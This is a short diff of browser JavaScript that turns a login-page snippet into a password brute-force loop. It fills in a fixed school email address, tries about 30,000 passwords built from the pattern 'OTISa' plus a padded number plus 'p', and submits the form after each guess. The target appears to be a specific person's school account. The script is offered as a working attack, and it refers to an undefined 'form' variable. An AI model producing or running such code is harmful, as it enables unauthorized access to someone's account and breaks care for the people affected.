@@ -1,8 +1,13 @@
+const loginForm = document.getElementById("logon")
+const usernameBox = document.getElementById("j_username")
+const passwordBox = document.getElementById("j_password")
 
+for (let i=70000; i < 100000; i++) {
+  usernameBox.value = "26ponirosa@oceanschools.org"
+  passwordBox.value = "OTISa" + format(i) + "p"
 
-
-firstInput.value = "26ponirosa@oceanschools.org"
-secondInput.value = "OTISa" + format(i) + "p"
+  form.requestSubmit();
+}
 
 function format(integer) {
   let value = "00000" + integer
